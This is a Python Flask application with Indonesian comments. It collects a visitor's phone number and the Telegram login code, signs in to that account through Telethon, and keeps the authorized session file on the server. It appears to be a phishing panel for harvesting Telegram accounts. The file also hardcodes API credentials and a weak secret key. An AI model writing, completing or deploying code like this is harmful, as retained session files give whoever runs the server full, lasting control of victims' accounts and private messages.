import asyncio
import os
import logging
from threading import Lock
from datetime import timedelta
from flask import Flask, render_template, request, redirect, url_for, flash, session
from telethon import TelegramClient
import nest_asyncio

# Setup logging yang lebih detail
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug.log'),
        logging.StreamHandler()
    ]
)

# Aktifkan nest_asyncio untuk menangani event loop
nest_asyncio.apply()

# Buat event loop global
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Konfigurasi
API_ID = '20115110'
API_HASH = '192c9900730edbd7e03fe772e3f8810d'
SECRET_KEY = 'ManusiaHebat'

# Buat absolute path untuk folder Session
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_FOLDER = os.path.join(BASE_DIR, "Session")
os.makedirs(SESSION_FOLDER, exist_ok=True)

# Thread-safe dictionary implementation
class ThreadSafeDict:
    def __init__(self):
        self._dict = {}
        self._lock = Lock()
    
    def __getitem__(self, key):
        with self._lock:
            return self._dict[key]
    
    def __setitem__(self, key, value):
        with self._lock:
            self._dict[key] = value
    
    def __delitem__(self, key):
        with self._lock:
            del self._dict[key]
    
    def __contains__(self, key):
        with self._lock:
            return key in self._dict
            
    def keys(self):
        with self._lock:
            return list(self._dict.keys())
    
    def items(self):
        with self._lock:
            return list(self._dict.items())

# Inisialisasi Flask dan clients dictionary
app = Flask(__name__)
app.secret_key = SECRET_KEY
app.permanent_session_lifetime = timedelta(minutes=5)
clients = ThreadSafeDict()

def cleanup_session(session_file):
    """Helper function untuk membersihkan file session jika terjadi error."""
    try:
        if os.path.exists(session_file):
            os.remove(session_file)
            logging.debug(f"Removed session file: {session_file}")
    except Exception as e:
        logging.error(f"Error cleaning up session file: {str(e)}")

def run_async(coro):
    """Helper function untuk menjalankan coroutine."""
    try:
        logging.debug("Running async function")
        return loop.run_until_complete(coro)
    except Exception as e:
        logging.error(f"Error in run_async: {str(e)}", exc_info=True)
        raise

async def init_client(phone_number, session_file):
    """Inisialisasi client."""
    try:
        logging.debug(f"Initializing client for {phone_number}")
        if phone_number not in clients:
            logging.debug("Creating new client")
            client = TelegramClient(session_file, API_ID, API_HASH, loop=loop)
            await client.connect()
            
            # Periksa koneksi
            if not client.is_connected():
                raise Exception("Failed to connect to Telegram")
            
            # Verifikasi koneksi dengan mencoba get_me()
            try:
                await client.get_me()
            except Exception as e:
                logging.error(f"Failed to verify connection: {str(e)}")
                cleanup_session(session_file)
                raise Exception("Failed to verify Telegram connection")
                
            clients[phone_number] = client
            logging.debug(f"Client created and stored in clients dictionary")
        return clients[phone_number]
    except Exception as e:
        logging.error(f"Error in init_client: {str(e)}", exc_info=True)
        if phone_number in clients:
            del clients[phone_number]
        raise

@app.before_request
def before_request():
    # Clear expired sessions
    if 'current_phone' in session:
        phone = session['current_phone']
        if phone not in clients:
            session.pop('current_phone', None)
            logging.debug(f"Cleared expired session for {phone}")

@app.after_request
def after_request(response):
    # Log active clients after each request
    logging.debug(f"Active clients after request: {list(clients.keys())}")
    return response

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        try:
            phone_number = request.form.get("phone_number", "").strip()
            if not phone_number:
                flash("Nomor telepon tidak boleh kosong")
                return redirect(url_for("index"))

            logging.debug(f"Received phone number: {phone_number}")

            if not phone_number.startswith("+"):
                phone_number = "+62" + phone_number.lstrip("0")
            logging.debug(f"Formatted phone number: {phone_number}")

            session_file = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '').replace(' ', '')}.session")
            logging.debug(f"Session file path: {session_file}")
            
            if os.path.exists(session_file):
                logging.debug(f"Session file permissions: {oct(os.stat(session_file).st_mode)[-3:]}")

            # Fungsi async yang lebih sederhana
            async def process_phone():
                client = await init_client(phone_number, session_file)
                if not await client.is_user_authorized():
                    await client.send_code_request(phone_number)

            # Jalankan fungsi async
            run_async(process_phone())
            
            # Simpan di session Flask
            session.permanent = True
            session['current_phone'] = phone_number
            logging.debug(f"Phone number stored in session: {session['current_phone']}")
            logging.debug(f"Current clients in dictionary: {list(clients.keys())}")
            
            return redirect(url_for("otp", phone_number=phone_number))

        except Exception as e:
            logging.error(f"Error in index: {str(e)}", exc_info=True)
            flash(f"Terjadi kesalahan: {str(e)}")
            if 'phone_number' in locals() and 'session_file' in locals():
                cleanup_session(session_file)
                if phone_number in clients:
                    try:
                        client = clients[phone_number]
                        run_async(client.disconnect())
                    except:
                        pass
                    del clients[phone_number]
            return redirect(url_for("index"))

    return render_template("index.html")

@app.route("/otp/<phone_number>", methods=["GET", "POST"])
def otp(phone_number):
    logging.debug(f"Accessing OTP route for {phone_number}")
    logging.debug(f"Available clients: {list(clients.keys())}")
    
    # Check Flask session
    current_phone = session.get('current_phone')
    logging.debug(f"Phone number from session: {current_phone}")
    
    if current_phone != phone_number:
        logging.error(f"Phone number mismatch. Session: {current_phone}, URL: {phone_number}")
        flash("Sesi tidak valid. Mulai ulang.")
        return redirect(url_for("index"))

    session_file = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '').replace(' ', '')}.session")
    
    if phone_number not in clients:
        try:
            client = run_async(init_client(phone_number, session_file))
            logging.debug(f"Reinitialized client for {phone_number}")
        except Exception as e:
            logging.error(f"Failed to reinitialize client: {str(e)}")
            cleanup_session(session_file)
            flash("Sesi tidak ditemukan. Mulai ulang.")
            return redirect(url_for("index"))

    if request.method == "POST":
        try:
            otp = request.form.get("otp", "").strip()
            if not otp:
                flash("Kode OTP tidak boleh kosong")
                return redirect(url_for("otp", phone_number=phone_number))

            logging.debug(f"Received OTP for {phone_number}")
            client = clients[phone_number]

            async def verify_code():
                logging.debug("Starting OTP verification")
                await client.sign_in(phone_number, otp)
                logging.debug("Sign in successful")
                user = await client.get_me()
                logging.debug(f"Got user info: {user.first_name}")
                await client.disconnect()
                logging.debug("Client disconnected")
                return user.first_name if user.first_name else "Pengguna"

            user_name = run_async(verify_code())
            flash(f"Tersedia {user_name} ({phone_number}).")
            logging.debug(f"Authentication successful for {user_name}")

            # Cleanup
            if phone_number in clients:
                del clients[phone_number]
                session.pop('current_phone', None)
                logging.debug(f"Removed client for {phone_number}")

            return redirect(url_for("index"))

        except Exception as e:
            logging.error(f"Error in OTP verification: {str(e)}", exc_info=True)
            flash(f"OTP salah atau terjadi kesalahan: {str(e)}")

            # Cleanup on error
            cleanup_session(session_file)
            if phone_number in clients:
                try:
                    client = clients[phone_number]
                    run_async(client.disconnect())
                except Exception as disconnect_error:
                    logging.error(f"Error disconnecting client: {str(disconnect_error)}")
                del clients[phone_number]
                session.pop('current_phone', None)
                logging.debug(f"Removed client for {phone_number} due to error")
            return redirect(url_for("index"))

    return render_template("otp.html", phone_number=phone_number)

@app.errorhandler(Exception)
def handle_error(error):
    logging.error(f"Unhandled error: {str(error)}", exc_info=True)
    flash("Terjadi kesalahan, coba lagi nanti.")
    return redirect(url_for("index"))

if __name__ == "__main__":
    try:
        logging.info("Starting Flask application")
        app.run(host="0.0.0.0", port=5000, debug=False)
    except Exception as e:
        logging.error(f"Error starting application: {str(e)}", exc_info=True)
    finally:
        # Cleanup saat aplikasi berhenti
        logging.info("Shutting down application")
        for phone, client in clients.items():
            try:
                run_async(client.disconnect())
                logging.debug(f"Disconnected client for {phone}")
            except Exception as e:
                logging.error(f"Error disconnecting client {phone}: {str(e)}")
        loop.close()
        logging.info("Application shutdown complete")
